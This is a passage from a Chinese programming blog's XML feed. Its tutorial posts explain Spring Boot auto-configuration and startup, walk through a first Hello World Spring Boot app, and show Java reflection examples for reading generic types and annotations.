class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Map&lt;String, List&lt;String&gt;&gt; loadSpringFactories(<span class="hljs-meta">@Nullable</span> ClassLoader classLoader) &#123;    <br>    <span class="hljs-comment">//获得classLoader ， 我们返回可以看到这里得到的就是EnableAutoConfiguration标注的类本身    </span><br>    MultiValueMap&lt;String, String&gt; result = (MultiValueMap)cache.get(classLoader);    <br>    <span class="hljs-keyword">if</span> (result != <span class="hljs-keyword">null</span>) &#123;        <br>        <span class="hljs-keyword">return</span> result;    <br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//去获取一个资源 &quot;META-INF/spring.factories&quot;            </span><br>            Enumeration&lt;URL&gt; urls = classLoader != <span class="hljs-keyword">null</span> ? classLoader.getResources(<span class="hljs-string">&quot;META-INF/spring.factories&quot;</span>) : ClassLoader.getSystemResources(<span class="hljs-string">&quot;META-INF/spring.factories&quot;</span>);<br>            LinkedMultiValueMap result = <span class="hljs-keyword">new</span> LinkedMultiValueMap();<br>            <span class="hljs-comment">//将读取到的资源遍历，封装成为一个Properties</span><br>            <span class="hljs-keyword">while</span>(urls.hasMoreElements()) &#123;<br>                URL url = (URL)urls.nextElement();<br>                UrlResource resource = <span class="hljs-keyword">new</span> UrlResource(url);<br>                Properties properties = PropertiesLoaderUtils.loadProperties(resource);<br>                Iterator var6 = properties.entrySet().iterator();<br>                <span class="hljs-keyword">while</span>(var6.hasNext()) &#123;<br>                    Entry&lt;?, ?&gt; entry = (Entry)var6.next();<br>                    String factoryClassName = ((String)entry.getKey()).trim();<br>                    String[] var9 = StringUtils.commaDelimitedListToStringArray((String)entry.getValue()); <br>                    <span class="hljs-keyword">int</span> var10 = var9.length;<br>                    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> var11 = <span class="hljs-number">0</span>; var11 &lt; var10; ++var11) &#123; <br>                        String factoryName = var9[var11];<br>                        result.add(factoryClassName, factoryName.trim());<br>                    &#125; <br>                &#125;    <br>            &#125;<br>            cache.put(classLoader, result); <br>            <span class="hljs-keyword">return</span> result;        <br>        &#125; <span class="hljs-keyword">catch</span> (IOException var13) &#123; <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(<span class="hljs-string">&quot;Unable to load factories from location [META-INF/spring.factories]&quot;</span>, var13);        <br>        &#125;    <br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>4、发现一个多次出现的文件：spring.factories，全局搜索它</p><h2 id="spring-factories"><a href="#spring-factories" class="headerlink" title="spring.factories"></a>spring.factories</h2><p>我们根据源头打开spring.factories ， 看到了很多自动配置的文件；这就是自动配置根源所在！</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7L1vFQMnaRIJSmeZ58T2eZicEIZDCZKtTPxQrKTvEdxHFGsG824OkO8XN8CfP2x4OdpC8DwjHYwcFw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><strong>WebMvcAutoConfiguration</strong></p><p>我们在上面的自动配置类随便找一个打开看看，比如 ：WebMvcAutoConfiguration</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7L1vFQMnaRIJSmeZ58T2eZicaV7UfSRiaRdCHNmHE1wS10QwbLEVZJLB2sN9ztcvjx7n2dKDJ0HrCmA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>可以看到这些一个个的都是JavaConfig配置类，而且都注入了一些Bean，可以找一些自己认识的类，看着熟悉一下！</p><p>所以，自动配置真正实现是从classpath中搜寻所有的META-INF/spring.factories配置文件 ，并将其中对应的 org.springframework.boot.autoconfigure. 包下的配置项，通过反射实例化为对应标注了 @Configuration的JavaConfig形式的IOC容器配置类 ， 然后将这些都汇总成为一个实例并加载到IOC容器中。</p><p><strong>结论：</strong></p><ol><li>SpringBoot在启动的时候从类路径下的META-INF/spring.factories中获取EnableAutoConfiguration指定的值</li><li>将这些值作为自动配置类导入容器 ， 自动配置类就生效 ， 帮我们进行自动配置工作；</li><li>整个J2EE的整体解决方案和自动配置都在springboot-autoconfigure的jar包中；</li><li>它会给容器中导入非常多的自动配置类 （xxxAutoConfiguration）, 就是给容器中导入这个场景需要的所有组件 ， 并配置好这些组件 ；</li><li>有了自动配置类 ， 免去了我们手动编写配置注入功能组件等的工作；</li></ol><p><strong>现在大家应该大概的了解了下，SpringBoot的运行原理，后面我们还会深化一次！</strong></p><blockquote><p><strong>SpringApplication</strong></p></blockquote><h2 id="不简单的方法"><a href="#不简单的方法" class="headerlink" title="不简单的方法"></a>不简单的方法</h2><p>我最初以为就是运行了一个main方法，没想到却开启了一个服务；</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@SpringBootApplicationpublic</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SpringbootApplication</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;     <br>        SpringApplication.run(SpringbootApplication.class, args);  <br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><strong>SpringApplication.run分析</strong></p><p>分析该方法主要分两部分，一部分是SpringApplication的实例化，二是run方法的执行；</p><h2 id="SpringApplication"><a href="#SpringApplication" class="headerlink" title="SpringApplication"></a>SpringApplication</h2><p><strong>这个类主要做了以下四件事情：</strong></p><p>1、推断应用的类型是普通的项目还是Web项目</p><p>2、查找并加载所有可用初始化器 ， 设置到initializers属性中</p><p>3、找出所有的应用程序监听器，设置到listeners属性中</p><p>4、推断并设置main方法的定义类，找到运行的主类</p><p>查看构造器：</p><ul><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">SpringApplication</span><span class="hljs-params">(ResourceLoader resourceLoader, Class... primarySources)</span> </span>&#123;<br>    <span class="hljs-comment">// ......</span><br>    <span class="hljs-keyword">this</span>.webApplicationType = WebApplicationType.deduceFromClasspath();<br>    <span class="hljs-keyword">this</span>.setInitializers(<span class="hljs-keyword">this</span>.getSpringFactoriesInstances());<br>    <span class="hljs-keyword">this</span>.setListeners(<span class="hljs-keyword">this</span>.getSpringFactoriesInstances(ApplicationListener.class));<br>    <span class="hljs-keyword">this</span>.mainApplicationClass = <span class="hljs-keyword">this</span>.deduceMainApplicationClass();<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="run方法流程分析"><a href="#run方法流程分析" class="headerlink" title="run方法流程分析"></a>run方法流程分析</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7L1vFQMnaRIJSmeZ58T2eZicjafiawQLp9u8wc4ic1Mjy6OyfibzfjVofeL5pnS1NSFKVjlIg6neI9ySg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>跟着源码和这幅图就可以一探究竟了！</p>]]></content>
    
    
    <categories>
      
      <category>Spring Boot</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Springboot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第一个SpringBoot</title>
    <link href="/2021/04/08/SpringBoot/%E7%AC%AC%E4%B8%80%E4%B8%AASpringBoot/"/>
    <url>/2021/04/08/SpringBoot/%E7%AC%AC%E4%B8%80%E4%B8%AASpringBoot/</url>
    
    <content type="html"><![CDATA[<h1 id="第一个程序"><a href="#第一个程序" class="headerlink" title="第一个程序"></a>第一个程序</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul><li>JDK 1.8</li><li>maven 3.6.1</li><li>springboot</li><li>IDEA</li></ul><p>官方：提供了一个快速开发网站，IDEA集成了该网站</p><p>相关代码</p><p>HelloController.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloController</span> </span>&#123;<br>    <span class="hljs-comment">//接口：http://localhost:8080/hello.do</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/hello.do&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">hell</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-comment">//调用业务接受前端参数</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello World&quot;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>相关配置文件</p><p>application.properties</p><figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-comment"># springbootp 核心配置文件</span><br><span class="hljs-comment">#更改项目的端口号</span><br><span class="hljs-attr">server.port</span>=<span class="hljs-number">6666</span><br></code></pre></div></td></tr></table></figure><p>banner.txt</p><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript"> ___       ________  ___      ___ _______           ________   ___  ___  __    ___  __    ___  ___       <br>|<span class="hljs-symbol">\ </span> <span class="hljs-symbol">\ </span>    |<span class="hljs-symbol">\ </span>  __  <span class="hljs-symbol">\|</span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\ </span>   /  /|<span class="hljs-symbol">\ </span> ___ <span class="hljs-symbol">\ </span>        |<span class="hljs-symbol">\ </span>  ___  <span class="hljs-symbol">\|</span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\|</span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\|</span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\ </span>|<span class="hljs-symbol">\ </span> <span class="hljs-symbol">\|</span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\ </span>|<span class="hljs-symbol">\ </span> <span class="hljs-symbol">\|</span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\ </span>     <br><span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\ </span>   <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\|</span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\ </span> /  / | <span class="hljs-symbol">\ </span>  __/|        <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\\</span> <span class="hljs-symbol">\ </span> <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\/</span>  /|<span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\/</span>  /|<span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\ </span>    <br> <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\ </span>   <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\\</span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\/</span>  / / <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\_</span>|/__       <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\\</span> <span class="hljs-symbol">\ </span> <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span>  ___  <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span>  ___  <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\ </span>   <br>  <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\_</span>___<span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\\</span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span>   / /   <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\_</span>|<span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span>      <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\\</span> <span class="hljs-symbol">\ </span> <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\\</span> <span class="hljs-symbol">\ </span> <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\\</span> <span class="hljs-symbol">\ </span> <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>_<span class="hljs-symbol">\ </span>  <br>   <span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>______<span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>______<span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>_/ /     <span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>______<span class="hljs-symbol">\ </span>      <span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>_<span class="hljs-symbol">\\</span> <span class="hljs-symbol">\_</span>_<span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>_<span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>_<span class="hljs-symbol">\\</span> <span class="hljs-symbol">\_</span>_<span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>_<span class="hljs-symbol">\\</span> <span class="hljs-symbol">\_</span>_<span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>_<span class="hljs-symbol">\|</span>__|   <br>    <span class="hljs-symbol">\|</span>_______|<span class="hljs-symbol">\|</span>_______|<span class="hljs-symbol">\|</span>__|/       <span class="hljs-symbol">\|</span>_______|        <span class="hljs-symbol">\|</span>__| <span class="hljs-symbol">\|</span>__|<span class="hljs-symbol">\|</span>__|<span class="hljs-symbol">\|</span>__| <span class="hljs-symbol">\|</span>__|<span class="hljs-symbol">\|</span>__| <span class="hljs-symbol">\|</span>__|<span class="hljs-symbol">\|</span>__|   ___ <br>                                                                                                    |<span class="hljs-symbol">\_</span>_\<br>                                                                                                    <span class="hljs-symbol">\|</span>__|<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Spring Boot</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Springboot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>微服务阶段</title>
    <link href="/2021/04/08/SpringBoot/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E9%98%B6%E6%AE%B5/"/>
    <url>/2021/04/08/SpringBoot/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E9%98%B6%E6%AE%B5/</url>
    
    <content type="html"><![CDATA[<h1 id="微服务阶段"><a href="#微服务阶段" class="headerlink" title="微服务阶段"></a>微服务阶段</h1><p>JAVASE：OOP</p><p>mysql：持久化</p><p>html+css+js+jquery+框架：视图</p><p>javaweb：独立开发MVC三层架构的网站（原始）</p><p>ssm：框架：简化我们的开发流程，配置开始较为繁琐</p><p>war：tomcat运行</p><p>spring再简化：SpringBoot-jar：内嵌tomcat；微服务架构</p><p>服务越来越多：springcloud</p>]]></content>
    
    
    <categories>
      
      <category>Spring Boot</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Springboot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java_base_注释与反射_4</title>
    <link href="/2021/04/08/Java/JavaBase/java_base_%E6%B3%A8%E9%87%8A%E4%B8%8E%E5%8F%8D%E5%B0%84_4/"/>
    <url>/2021/04/08/Java/JavaBase/java_base_%E6%B3%A8%E9%87%8A%E4%B8%8E%E5%8F%8D%E5%B0%84_4/</url>
    
    <content type="html"><![CDATA[<h1 id="注释与反射学习——4"><a href="#注释与反射学习——4" class="headerlink" title="注释与反射学习——4"></a>注释与反射学习——4</h1><h2 id="反射操作泛型"><a href="#反射操作泛型" class="headerlink" title="反射操作泛型"></a>反射操作泛型</h2><ul><li><p>Java采用泛型擦除的机制来引入泛型,Java中的泛型仅仅是给编译器javac使用的,确保数据的安全性和免去强制类型转换问题，但是，一旦编译完成﹐所有和泛型有关的类型全部擦除</p></li><li><p>为了通过反射操作这些类型,Java新增了ParameterizedTypeGenericArrayType ,TypeVariable和 WildcardType几种类型来代表不能被归一到Class类中的类型但是又和原始类型齐名的类型.</p></li><li><p>ParameterizedType:表示一种参数化类型,比如Collection<String></p></li><li><p>GenericArrayType:表示一种元素类型是参数化类型或者类型变量的数组类型</p></li><li><p>TypeVariable:是各种类型变量的公共父接口</p></li><li><p>WildcardType:代表一种通配符类型表达式</p></li></ul><p>Test_11.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.ParameterizedType;<br><span class="hljs-keyword">import</span> java.lang.reflect.Type;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">//通过反射获取泛型</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test_11</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test1</span><span class="hljs-params">(Map&lt;String,Dog&gt; map, List&lt;Dog&gt; list)</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;test1&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Map&lt;String,Dog&gt; <span class="hljs-title">test2</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;test2&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException </span>&#123;<br>        Method method = Test_11.class.getMethod(<span class="hljs-string">&quot;test1&quot;</span>, Map.class, List.class);<br><br>        Type[] genericExceptionTypes = method.getGenericParameterTypes();<br>        <span class="hljs-keyword">for</span> (Type genericExceptionType : genericExceptionTypes) &#123;<br>            System.out.println(genericExceptionType);<br>            <span class="hljs-keyword">if</span>(genericExceptionType <span class="hljs-keyword">instanceof</span> ParameterizedType)&#123;<br>                Type[] actualTypeArguments = ((ParameterizedType) genericExceptionType).getActualTypeArguments();<br>                <span class="hljs-keyword">for</span> (Type actualTypeArgument : actualTypeArguments) &#123;<br>                    System.out.println(actualTypeArgument);<br>                &#125;<br>            &#125;<br>        &#125;<br>        method=Test_11.class.getMethod(<span class="hljs-string">&quot;test2&quot;</span>,<span class="hljs-keyword">null</span>);<br>        Type genericReturnType = method.getGenericReturnType();<br>        <span class="hljs-keyword">if</span>(genericReturnType <span class="hljs-keyword">instanceof</span> ParameterizedType)&#123;<br>            Type[] actualTypeArguments = ((ParameterizedType) genericReturnType).getActualTypeArguments();<br>            <span class="hljs-keyword">for</span> (Type actualTypeArgument : actualTypeArguments) &#123;<br>                System.out.println(actualTypeArgument);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="获取注解信息"><a href="#获取注解信息" class="headerlink" title="获取注解信息"></a>获取注解信息</h2><p>ORM</p><p>Test_12.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.annotation.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-comment">//练习反射操作注解</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test_12</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException </span>&#123;<br>        Class c1=Class.forName(<span class="hljs-string">&quot;ll.注解与反射.Cat&quot;</span>);<br>        <span class="hljs-comment">//通过反射获得注解</span><br>        Annotation[] annotations = c1.getAnnotations();<br>        <span class="hljs-keyword">for</span> (Annotation annotation : annotations) &#123;<br>            System.out.println(annotation);<br>        &#125;<br>        <span class="hljs-comment">//获得注解的value的值</span><br>        Table table=(Table)c1.getAnnotation(Table.class);<br>        String value=table.value();<br>        System.out.println(value);<br><br>        <span class="hljs-comment">//获得类指定的注解</span><br>        Field f=c1.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        FieldL annotation = f.getAnnotation(FieldL.class);<br>        System.out.println(annotation.columnName());<br>        System.out.println(annotation.type());<br>        System.out.println(annotation.length());<br><br>    &#125;<br>&#125;<br><span class="hljs-meta">@Table(&quot;cat&quot;)</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cat</span></span>&#123;<br>    <span class="hljs-meta">@FieldL(columnName = &quot;cat_id&quot;,type = &quot;int&quot;,length = 10)</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> id;<br>    <span class="hljs-meta">@FieldL(columnName = &quot;cat_age&quot;,type = &quot;int&quot;,length = 10)</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> age;<br>    <span class="hljs-meta">@FieldL(columnName = &quot;cat_name&quot;,type = &quot;varchar&quot;,length = 3)</span><br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getId</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> id;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setId</span><span class="hljs-params">(<span class="hljs-keyword">int</span> id)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.id = id;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getAge</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setAge</span><span class="hljs-params">(<span class="hljs-keyword">int</span> age)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Cat</span><span class="hljs-params">(<span class="hljs-keyword">int</span> id, <span class="hljs-keyword">int</span> age, String name)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.id = id;<br>        <span class="hljs-keyword">this</span>.age = age;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">//类名的注解</span><br><span class="hljs-meta">@Target(ElementType.TYPE)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@interface</span> Table&#123;<br>    <span class="hljs-function">String <span class="hljs-title">value</span><span class="hljs-params">()</span></span>;<br>&#125;<br><br><span class="hljs-comment">//属性的注解</span><br><span class="hljs-meta">@Target(ElementType.FIELD)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@interface</span> FieldL&#123;<br>    <span class="hljs-function">String <span class="hljs-title">columnName</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function">String <span class="hljs-title">type</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">length</span><span 